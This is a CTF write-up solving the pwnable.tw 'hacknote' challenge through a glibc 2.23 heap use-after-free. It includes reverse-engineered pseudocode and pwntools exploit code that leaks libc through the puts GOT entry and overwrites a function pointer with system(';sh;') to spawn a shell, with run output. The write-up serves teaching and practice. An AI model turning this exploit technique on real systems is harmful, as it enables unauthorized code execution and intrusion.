# hacknote (heap-exploitation, use-after-free, glibc 2.23)

Notes:
- ASLR enabled
- glibc 2.23
- binary given

## Enumeration
I've started with patching the binary so I can play with it localy. I've explained how to do this step by step in [this](https://github.com/kscieslinski/CTF/tree/master/pwn/pwnabletw/dubblesort) writeup.

```bash
$ ls
hacknote  ld-2.23.so  libc_32.so.6  patched
```

### RE
Then I've started with playing with the binary:

```bash
$ LD_PRELOAD=$PWD/libc_32.so.6 ./patched
----------------------
       HackNote       
----------------------
 1. Add note          
 2. Delete note       
 3. Print note        
 4. Exit              
----------------------
Your choice :1
Note size :10
Content :Note   
Success !
----------------------
       HackNote       
----------------------
 1. Add note          
 2. Delete note       
 3. Print note        
 4. Exit              
----------------------
Your choice :3
Index :0
Note

----------------------
       HackNote       
----------------------
 1. Add note          
 2. Delete note       
 3. Print note        
 4. Exit              
----------------------
Your choice :2
Index :0
Success
----------------------
       HackNote       
----------------------
 1. Add note          
 2. Delete note       
 3. Print note        
 4. Exit              
----------------------
Your choice :4
```

So the program let's the user to create/delete/print content of notes. I've done [similar challenge](https://github.com/kscieslinski/CTF/tree/master/pwn/pico2019/Ghost_Diary) a month ago at picoCTF 2019 so at this point I was quite confident that this challenge has to do something with memory allocation and therefore heap-exploitation.

Using Ghidra I've quicly reconstructed the pseudocode.

```c
// simplified!

struct slot {
    void (*puts_wrapper)(char*);
    char* content;
};

void* slots[5];
int nslots = 0;


void puts_wrapper_func(char* str) 
{
    puts(str);
}

void allocate_slot() 
{
    size_t size;

    if (nslots >= 5) return;

    void *new_slot = malloc(sizeof(struct slot));
    new_slot->puts_wrapper = &puts_wrapper_func;
    
    puts("Note size :");
    scanf("%u", &size);

    new_slot->content = malloc(size);
    puts("Content :");
    read(0, new_slot->content, size);

    slots[nslots] = new_slot;
    nslots++;
}

void delete_slot() 
{
    size_t idx;

    puts("Index :");
    scanf("%u", &idx);
    if (idx > nslots) return;

    void *slot = slots[idx];
    free(slot->content);
    free(slot);
}

void read_slot()
{
    size_t idx;

    puts("Index :");
    scanf("%u", &idx);
    if (idx > nslots) return;

    void *slot = slots[idx];
    (slot->puts_wrapper)(slot->content);
}

int main(void)
{
    setvbuf(stdout,(char *)0x0,2,0);
    setvbuf(stdin,(char *)0x0,2,0);

    while (true) {
        display_menu();
        char cmd = getchar();
        switch (cmd) {
            case 1:
                allocate_slot();
                break;

            case 2:
                delete_slot();
                break;

            case 3:
                read_slot();
                break;

            case 4:
                exit(0);

            default:
                puts("Invalid choice");
                break;
        }
    }
}
```

### Rabbit hole
I could quicly spot a standard double-free vulnerability. The program doesn't check if a slot has been already freed in delete_slot function. I was super thrilled as double free with glibc 2.23 should be an easy win. My plan was to first get uaf on `nslots`, then leak libc address and then gain shell by abusing fastbin cache:

```python

allocate_slot(0x90, b'A'); # slot 0, h0, c0
allocate_slot(0x90, b'B'); # slot 1, h1, c1

free_slot(0);
free_slot(1);
free_slot(0);

# At this point we have:
# FB_0x90 -> c0 -> c1 -> c0
# FB_0x10 -> h0 -> h1 -> h0 (won't use)

allocate_slot(0x90, p32(&nslots)); # slot 2, h0, c0

# At this point we have:
# FB_0x90 -> c1 -> c0 -> &nslots
# FB_0x10 -> h1 -> h0 (won't use)

allocate_slot(0x90, b'D'); # slot 3, h1, c1

# At this point we have:
# FB_0x90 -> c0 -> &nslots
# FB_0x10 -> h0 (won't use)

allocate_slot(0x90, b'E'); # slot 4, c0, c0

# At this point we have:
# FB_0x90 -> &nslots

allocate_slot(0x90, -1000); # slot 5, overwrite &nslots

# [leak libc]
# [gain shell]
```

Unfortunetely the program allows user to allocate at max 5 slots and it doesn't decrease the slots number when freeing. I've spend hours trying to reduce the number of used slots, but I've failed.
It was super anoying because every time I was so close!

### New approach
I had to find another way to obtain shell. I was quite sure it has be something with puts_wrapper from struct slot. Meaning that I had to overwrite the function pointer somehow. Till then I've only played around with content chunks as program doesn't allow us to write over full struct.

### Or maybe it does?
What if we allocate_slot with content size equal to struct slot so on free it ends up in same fastbin?

```python
allocate_slot(0x10, b'A' * (0x10 - 0x4)); # slot 0, h0, c0

free_slot(0);

# At this point we have
# FB_0x10 -> h0 -> c0

allocate_slot(0x10, b'B' * (0x10 - 0x4)); # slot 1, h0, c0
```

Nothing interesting... We just get same chunks we freed as fastbins act as LIFO (last in, first out).
But whay if we disturb this symmetry? How? Well, we can just free 4 chunks of size 0x10 and then ask for only 1 chunk and then ask for 2 chunks. The last chunk will have the content being a struct of already allocated slot!

```python

# Start with allocating 4 fastbin chunks
allocate_slot(0x8, b'A' * (0x08 - 0x04)) # slot 0, h0|c0
allocate_slot(0x8, b'B' * (0x08 - 0x04)) # slot 1, h1|c1

# Now let's free them
free_slot(1)
free_slot(0)

# At this point we have all four chunks in fastbin_0x10
# FB_0x10 -> h0 -> c0 -> h1 -> c1

# Our goal is to swap header with content, so take only one chunk from list.
allocate_slot(0x90, b'C') # slot 2: h0|c3

# At this point we have three chunks in fastbin_0x10
# FB_0x10 -> c0 -> h1 -> c1

# This allocation will result in swaping content with header. 
# Note that slot 1 (h1|c1) is still accessable with header pointing to same chunk as new slot's content. 
# Therefore the content of new slot will overwrite the slot 1's header!
allocate_slot(0x0c, b'D' * (0x0c - 0x04)) # slot 3, c0|h1
```

Ha, amazing! Let's instead of overwriting a header with 'DDDDDDDD' overwrite it with got@puts address to leak libc_base!

```
[...]
# This allocation will result in swaping content with header. 
# Note that slot 1 (h1|c1) is still accessable with header pointing to same chunk as new slot's content. 
# Therefore the content of new slot will overwrite the slot 1's header!
# We want to leak libc address. Till now, the program has used puts to display menu and so we will find an address to libc_puts inside got table.
allocate_slot(0x0c, p32(PUTS_WRAPPER_ADDR) + p32(e.got['puts'])) # slot 3, c0|h1
puts_addr = u32(read_slot(1)[:4])
libc_base = puts_addr - libc.symbols['puts']
log.info('[x] Found libc_base: ' + hex(libc_base))
```

Test it!

```bash
$ python3 exp.py
[+] Opening connection to chall.pwnable.tw on port 10102: Done
[*] './/patched'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] './libc_32.so.6'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] [x] Found libc_base: 0x7fe94eb
```

Super, now we are left with just one more allocation, but it is all we need! Just overwrite a puts_wrapper with system address and the content with ';sh;';

```python
# We are left with one chunk in fastbin_0x10. We won't use it.
# FB_0x10 -> c1

# Now we want to perform same trick again. We will invoke system function this time.
# But before we need to reallocate the slot as we can write only on allocation.
free_slot(3)

# Fastbins act as LIFO so we will get same chunks on next allocation!
# FB_0x10 -> c0 -> h1 -> c1

# Set system() function with ;sh; as arg. 
# Note: simple /bin/sh won't work. We overwrite the puts_wrapper with system address. And the logic expected an address of a string to print. Therefore if we provide a standard /bin/sh we would end with calling 
# system('\x08x04\x0a\x48/bin/sh') <- address would vary as ASLR is enabled
# So we just have to separete the 'sh' command with ';'.
system_addr = libc_base + libc.symbols['system']
allocate_slot(0x0c, p32(system_addr) + b';sh;') # slot 4, c0|h1

# We won't get a response here as no puts will be invoked
read_slot_no_content(1)
```

And then just get a shell:

```python
# SHELL!!!
p.interactive()
```

All we need to do is to run our [exploit](exp.py):

```bash
$ python3 exp.py 
[+] Opening connection to chall.pwnable.tw on port 10102: Done
[*] './patched'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] './libc_32.so.6'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] [x] Found libc_base: 0xf75ee000
[*] Switching to interactive mode
$ id
uid=1000(hacknote) gid=1000(hacknote) groups=1000(hacknote)
```